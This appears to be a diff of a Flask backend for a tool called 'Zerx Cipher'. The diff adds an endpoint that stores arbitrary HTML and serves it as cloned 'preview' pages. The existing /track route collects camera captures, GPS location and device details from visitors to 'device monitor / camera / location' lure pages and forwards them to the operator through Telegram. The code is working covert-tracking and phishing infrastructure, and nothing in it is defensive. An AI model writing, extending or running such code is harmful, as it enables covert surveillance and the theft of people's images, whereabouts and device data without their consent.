@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 # server.py — Flask backend for Zerx Cipher
-# Endpoints: /api/verify, /api/clone/<slug>, /api/clone-store, /track, /health
+# Endpoints: /api/verify, /api/clone/<slug>, /api/clone-store,
+#            /api/preview-store, /preview/<slug>,
+#            /track, /health
 # Includes permissive CORS so the Netlify-hosted pages can call it.
 
 from flask import Flask, request, jsonify, Response
@@ -17,6 +19,7 @@ DIVIDER     = "━━━━━━━━━━━━━━━━"
 FOOTER      = "⚡ Developed by: @zerxofficial"
 
 _CLONES = {}
+_PREVIEWS = {}
 _LAST_EVENT = {}
 
 ALLOWED_ORIGINS = {
@@ -81,6 +84,9 @@ def _recent(uid, typ, window=30):
     last = _LAST_EVENT.get(uid, {})
     return last.get(typ) and (time.time() - last[typ]) < window
 
+# ============================================================
+# VERIFY (link tokens)
+# ============================================================
 @app.route("/api/verify", methods=["GET", "OPTIONS"])
 def api_verify():
     if request.method == "OPTIONS":
@@ -102,6 +108,9 @@ def api_verify():
         return jsonify({"ok": False, "reason": "bad_signature"}), 403
     return jsonify({"ok": True, "uid": uid})
 
+# ============================================================
+# CLONE STORE (device monitor / camera / location pages)
+# ============================================================
 @app.route("/api/clone-store", methods=["POST"])
 def clone_store():
     try:
@@ -141,6 +150,59 @@ def api_clone(slug):
         pass
     return "Not found", 404
 
+# ============================================================
+# PREVIEW STORE (web scrapper mirror)
+# ============================================================
+@app.route("/api/preview-store", methods=["POST", "OPTIONS"])
+def preview_store():
+    if request.method == "OPTIONS":
+        return ("", 204)
+    try:
+        data = request.get_json(force=True) or {}
+        slug = (data.get("slug") or "").strip()
+        html = data.get("html") or ""
+        if not slug or not html:
+            return jsonify({"ok": False, "error": "missing slug or html"}), 400
+        _PREVIEWS[slug] = html
+        try:
+            con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
+            con.execute("""CREATE TABLE IF NOT EXISTS preview_html(
+                             slug TEXT PRIMARY KEY, html TEXT, created TEXT)""")
+            con.execute("INSERT OR REPLACE INTO preview_html(slug,html,created) VALUES(?,?,?)",
+                        (slug, html, datetime.now(timezone.utc).isoformat()))
+            con.commit()
+            con.close()
+        except Exception:
+            pass
+        return jsonify({"ok": True, "slug": slug}), 200
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+
+@app.route("/preview/<slug>", methods=["GET"])
+def preview_view(slug):
+    html = _PREVIEWS.get(slug)
+    if html:
+        return Response(html, mimetype="text/html; charset=utf-8")
+    try:
+        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
+        con.row_factory = sqlite3.Row
+        row = con.execute("SELECT html FROM preview_html WHERE slug=?", (slug,)).fetchone()
+        con.close()
+        if row:
+            return Response(row["html"], mimetype="text/html; charset=utf-8")
+    except Exception:
+        pass
+    return Response(
+        "<!doctype html><meta charset='utf-8'><title>Not found</title>"
+        "<body style='font:14px -apple-system,Segoe UI,sans-serif;background:#0e0e11;"
+        "color:#eee;display:flex;align-items:center;justify-content:center;"
+        "height:100vh;margin:0'><div>Preview not found or expired.</div></body>",
+        status=404, mimetype="text/html; charset=utf-8"
+    )
+
+# ============================================================
+# TRACK (device monitor callbacks)
+# ============================================================
 @app.route("/track", methods=["POST", "OPTIONS"])
 def track():
     if request.method == "OPTIONS":
@@ -158,13 +220,11 @@ def track():
     if not BOT_TOKEN:
         return jsonify({"ok": True}), 200
 
-    # Deduplicate: suppress same-type events from same uid within 30s.
     if typ in ("device_info", "location", "camera") and _recent(uid, typ, 30):
         return jsonify({"ok": True, "dup": True}), 200
 
     now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
 
-    # ── CAMERA ──
     if typ == "camera" and isinstance(payload, dict) and payload.get("image"):
         caption = (
             f"📸 <b>Camera Capture Received</b>\n"
@@ -177,7 +237,6 @@ def track():
         _mark(uid, "camera")
         return jsonify({"ok": True}), 200
 
-    # ── LOCATION ──
     if typ == "location" and isinstance(payload, dict):
         lat = payload.get("lat")
         lon = payload.get("lon")
@@ -197,7 +256,6 @@ def track():
         _mark(uid, "location")
         return jsonify({"ok": True}), 200
 
-    # ── DEVICE INFO ──
     if typ == "device_info" and isinstance(payload, dict):
         ua = payload.get("ua", "n/a")
         platform = payload.get("platform", "n/a")
@@ -261,8 +319,6 @@ def track():
         _mark(uid, "device_info")
         return jsonify({"ok": True}), 200
 
-    # ── FALLBACK ──
-    # Only reach here for unknown types (not device_info/location/camera).
     text = (
         f"📡 <b>{typ}</b>\n"
         f"{DIVIDER}\n"
@@ -273,6 +329,9 @@ def track():
     _send_telegram_text(uid, text)
     return jsonify({"ok": True}), 200
 
+# ============================================================
+# HEALTH
+# ============================================================
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"ok": True, "ts": datetime.now(timezone.utc).isoformat()})
